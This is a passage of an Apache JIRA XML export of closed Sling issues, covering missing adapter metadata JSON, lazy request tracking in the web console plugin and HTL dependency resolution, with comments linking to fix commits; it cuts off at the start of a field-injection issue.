                            <comment id="17580684" author="kwin" created="Wed, 17 Aug 2022 09:02:58 +0000"  >&lt;p&gt;Fixed in &lt;a href=&quot;https://github.com/apache/sling-tooling-jenkins/commit/b4ab2e0bb6a5361ebe71b3bb7e2cb443873e8f6e&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-tooling-jenkins/commit/b4ab2e0bb6a5361ebe71b3bb7e2cb443873e8f6e&lt;/a&gt;.&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="10030">
                    <name>Reference</name>
                                            <outwardlinks description="relates to">
                                        <issuelink>
            <issuekey id="13453708">SLING-11401</issuekey>
        </issuelink>
                            </outwardlinks>
                                                        </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 10 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z17ot4:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11519] Generate adapter metadata json for adaptations natively supported by FileResource</title>
                <link>https://issues.apache.org/jira/browse/SLING-11519</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;Currently the Felix Web Console plugin at &lt;tt&gt;/system/console/adapters&lt;/tt&gt; doesn&apos;t expose the adaptation from &lt;tt&gt;FileResource&lt;/tt&gt; to &lt;tt&gt;File&lt;/tt&gt; and &lt;tt&gt;URL&lt;/tt&gt; as the adapter JSON metadata is not included in the bundle although the annotations are set in &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-fsresource/blob/48ea87e1420dbae87874c5f7a147e12483f9ae9f/src/main/java/org/apache/sling/fsprovider/internal/mapper/FileResource.java#L60&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-fsresource/blob/48ea87e1420dbae87874c5f7a147e12483f9ae9f/src/main/java/org/apache/sling/fsprovider/internal/mapper/FileResource.java#L60&lt;/a&gt;.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13475729">SLING-11519</key>
            <summary>Generate adapter metadata json for adaptations natively supported by FileResource</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="kwin">Konrad Windszus</assignee>
                                    <reporter username="kwin">Konrad Windszus</reporter>
                        <labels>
                    </labels>
                <created>Mon, 8 Aug 2022 11:37:16 +0000</created>
                <updated>Mon, 10 Mar 2025 10:42:54 +0000</updated>
                            <resolved>Sun, 21 Aug 2022 11:32:35 +0000</resolved>
                                    <version>File System Resource Provider 2.2.0</version>
                                    <fixVersion>File System Resource Provider 2.3.0</fixVersion>
                                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="3000">50m</timespent>
                                <comments>
                            <comment id="17582533" author="kwin" created="Sun, 21 Aug 2022 11:32:35 +0000"  >&lt;p&gt;Fixed in &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-fsresource/commit/20a21bb037bd0db84ebaf459d0ae2eab9169b02c&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-fsresource/commit/20a21bb037bd0db84ebaf459d0ae2eab9169b02c&lt;/a&gt;.&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="10020">
                    <name>Cloners</name>
                                            <outwardlinks description="is a clone of">
                                        <issuelink>
            <issuekey id="13475672">SLING-11516</issuekey>
        </issuelink>
                            </outwardlinks>
                                                        </issuelinktype>
                            <issuelinktype id="10030">
                    <name>Reference</name>
                                            <outwardlinks description="relates to">
                                        <issuelink>
            <issuekey id="13347608">SLING-10022</issuekey>
        </issuelink>
                            </outwardlinks>
                                                        </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 9 weeks, 3 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z17klc:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11518] Requests are not recorded until web console plugin is invoked</title>
                <link>https://issues.apache.org/jira/browse/SLING-11518</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;As request tracking is implemented using a lazy DS component, this component is only initialialized once it gets accessed for the first time, for example if the user accesses the web console plugin. Therefore the first time the plugin is accessed it is empty.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13475699">SLING-11518</key>
            <summary>Requests are not recorded until web console plugin is invoked</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="cziegeler">Carsten Ziegeler</assignee>
                                    <reporter username="cziegeler">Carsten Ziegeler</reporter>
                        <labels>
                    </labels>
                <created>Mon, 8 Aug 2022 09:19:08 +0000</created>
                <updated>Fri, 12 Aug 2022 11:19:18 +0000</updated>
                            <resolved>Mon, 8 Aug 2022 09:22:06 +0000</resolved>
                                    <version>Engine 2.9.2</version>
                                    <fixVersion>Engine 2.10.2</fixVersion>
                                    <component>Engine</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17576656" author="cziegeler" created="Mon, 8 Aug 2022 09:22:06 +0000"  >&lt;p&gt;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-engine/commit/5104d6a855d97a39819e6bcb638750e17c9e6a8a&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-engine/commit/5104d6a855d97a39819e6bcb638750e17c9e6a8a&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 11 weeks, 3 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z17keo:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11516] Generate adapter metadata json for adaptations natively supported by ResourceResolverImpl</title>
                <link>https://issues.apache.org/jira/browse/SLING-11516</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;Currently the Felix Web Console plugin at &lt;tt&gt;/system/console/adapters&lt;/tt&gt; doesn&apos;t expose the adaptation from &lt;tt&gt;ResourceResolver&lt;/tt&gt; to &lt;tt&gt;javax.jcr.Session&lt;/tt&gt; and &lt;tt&gt;ResourceMapper&lt;/tt&gt; as the adapter JSON metadata is not included in the bundle.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13475672">SLING-11516</key>
            <summary>Generate adapter metadata json for adaptations natively supported by ResourceResolverImpl</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="kwin">Konrad Windszus</assignee>
                                    <reporter username="kwin">Konrad Windszus</reporter>
                        <labels>
                    </labels>
                <created>Mon, 8 Aug 2022 07:00:23 +0000</created>
                <updated>Fri, 12 Aug 2022 11:18:46 +0000</updated>
                            <resolved>Mon, 8 Aug 2022 08:37:44 +0000</resolved>
                                    <version>Resource Resolver 1.9.0</version>
                                    <fixVersion>JCR Resource 3.2.2</fixVersion>
                    <fixVersion>Resource Resolver 1.10.0</fixVersion>
                                    <component>ResourceResolver</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="4800">1h 20m</timespent>
                                <comments>
                            <comment id="17576588" author="kwin" created="Mon, 8 Aug 2022 07:18:26 +0000"  >&lt;p&gt;In fact the metadata at &lt;tt&gt;SLING-INF/adapters.json&lt;/tt&gt; is already generated but unfortunately no longer contained in the resulting bundle. This is a regression of &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-7665&quot; title=&quot;Use bnd Maven plugins&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-7665&quot;&gt;&lt;del&gt;SLING-7665&lt;/del&gt;&lt;/a&gt;. &lt;/p&gt;</comment>
                            <comment id="17576594" author="cziegeler" created="Mon, 8 Aug 2022 07:29:00 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=kwin&quot; class=&quot;user-hover&quot; rel=&quot;kwin&quot;&gt;kwin&lt;/a&gt; Isn&apos;t adapting to a session supported by the JCR Provider, not the resource resolver?&lt;/p&gt;</comment>
                            <comment id="17576596" author="kwin" created="Mon, 8 Aug 2022 07:30:57 +0000"  >&lt;p&gt;It is a delegation pattern being used, but the adaptation is from &lt;tt&gt;ResourceResolver&lt;/tt&gt; to &lt;tt&gt;javax.jcr.Session&lt;/tt&gt;, and should be listed as such in the web console plugin.&lt;/p&gt;</comment>
                            <comment id="17576607" author="cziegeler" created="Mon, 8 Aug 2022 07:54:43 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=kwin&quot; class=&quot;user-hover&quot; rel=&quot;kwin&quot;&gt;kwin&lt;/a&gt; I&apos;m not arguing that the adaption to Session should be listed - but it should only be listed if it is available. If no JCR provider is installed, then this will never succeed. The information about this should rather be moved into the jcr bundle to reflect reality.&lt;br/&gt;
If that&apos;s currently not possible with the annotations, then ok, but otherwise we should clean this up&lt;/p&gt;</comment>
                            <comment id="17576632" author="kwin" created="Mon, 8 Aug 2022 08:27:31 +0000"  >&lt;p&gt;Got it. Good idea, &lt;br/&gt;
&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-resourceresolver/pull/79&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-resourceresolver/pull/79&lt;/a&gt; (for Resource Resolver) and&lt;br/&gt;
&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-jcr-resource/pull/34&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-jcr-resource/pull/34&lt;/a&gt; (for JCR Resource Provider)&lt;br/&gt;
should fix this. &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=cziegeler&quot; class=&quot;user-hover&quot; rel=&quot;cziegeler&quot;&gt;cziegeler&lt;/a&gt; Please have a look.&lt;/p&gt;</comment>
                            <comment id="17576633" author="cziegeler" created="Mon, 8 Aug 2022 08:31:56 +0000"  >&lt;p&gt;Thanks , looks good to me&lt;/p&gt;</comment>
                            <comment id="17576635" author="kwin" created="Mon, 8 Aug 2022 08:37:44 +0000"  >&lt;p&gt;Fixed in &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-jcr-resource/commit/05e7c605fbb453eb7f75a6f863ac36f3c281f9bf&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-jcr-resource/commit/05e7c605fbb453eb7f75a6f863ac36f3c281f9bf&lt;/a&gt; and &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-resourceresolver/commit/97939db9a0a4b7ebe752ff7edfbbd1fc0751ade6&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-resourceresolver/commit/97939db9a0a4b7ebe752ff7edfbbd1fc0751ade6&lt;/a&gt;.&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="10020">
                    <name>Cloners</name>
                                                                <inwardlinks description="is cloned by">
                                        <issuelink>
            <issuekey id="13475729">SLING-11519</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                            <issuelinktype id="10030">
                    <name>Reference</name>
                                            <outwardlinks description="relates to">
                                        <issuelink>
            <issuekey id="13347608">SLING-10022</issuekey>
        </issuelink>
                            </outwardlinks>
                                                        </issuelinktype>
                            <issuelinktype id="12310050">
                    <name>Regression</name>
                                                                <inwardlinks description="is broken by">
                                        <issuelink>
            <issuekey id="13158889">SLING-7665</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 11 weeks, 3 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z17k8w:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11508] Make dependency resolution use ResourceResolver#getResource instead of ResourceResolver#resolve</title>
                <link>https://issues.apache.org/jira/browse/SLING-11508</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;Given that &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-11373&quot; title=&quot;The MergingServletResourceProvider does not wrap resources correctly&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-11373&quot;&gt;&lt;del&gt;SLING-11373&lt;/del&gt;&lt;/a&gt; was fixed, the HTL modules should switch back to &lt;tt&gt;ResourceResolver#getResource&lt;/tt&gt; for their dependency resolution.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13474843">SLING-11508</key>
            <summary>Make dependency resolution use ResourceResolver#getResource instead of ResourceResolver#resolve</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="radu">Radu Cotescu</assignee>
                                    <reporter username="radu">Radu Cotescu</reporter>
                        <labels>
                    </labels>
                <created>Wed, 3 Aug 2022 08:37:18 +0000</created>
                <updated>Fri, 12 Aug 2022 11:18:23 +0000</updated>
                            <resolved>Wed, 3 Aug 2022 16:11:57 +0000</resolved>
                                    <version>Scripting HTL Engine 1.4.2-1.4.0</version>
                    <version>Scripting HTL JS Use Provider 1.2.2</version>
                                    <fixVersion>Scripting HTL Testing 1.0.32-1.4.0</fixVersion>
                    <fixVersion>Scripting HTL Engine 1.4.20-1.4.0</fixVersion>
                    <fixVersion>Scripting HTL JS Use Provider 1.2.8</fixVersion>
                                    <component>Scripting</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="4800">1h 20m</timespent>
                                <comments>
                            <comment id="17574778" author="radu.cotescu" created="Wed, 3 Aug 2022 16:11:51 +0000"  >&lt;p&gt;Fixed in:&lt;/p&gt;
&lt;ul&gt;
	&lt;li&gt;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-scripting-sightly/commit/af7c5185c56b550fc764052bcc3bbaa534362531&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-scripting-sightly/commit/af7c5185c56b550fc764052bcc3bbaa534362531&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-scripting-sightly-js-provider/commit/aaa1f7db33f887d40bf5f425f98793fc535c0550&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-scripting-sightly-js-provider/commit/aaa1f7db33f887d40bf5f425f98793fc535c0550&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-scripting-sightly-testing/commit/687da73b40a1b2e4b7bdfa3064a8fb24546e651b&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-scripting-sightly-testing/commit/687da73b40a1b2e4b7bdfa3064a8fb24546e651b&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="10030">
                    <name>Reference</name>
                                                                <inwardlinks description="is related to">
                                        <issuelink>
            <issuekey id="13448275">SLING-11373</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 12 weeks ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z17f68:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11507] Field injection should not inject static and final fields and methods</title>
                <link>https://issues.apache.org/jira/browse/SLING-11507</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;Currently this injection works:&lt;/p&gt;

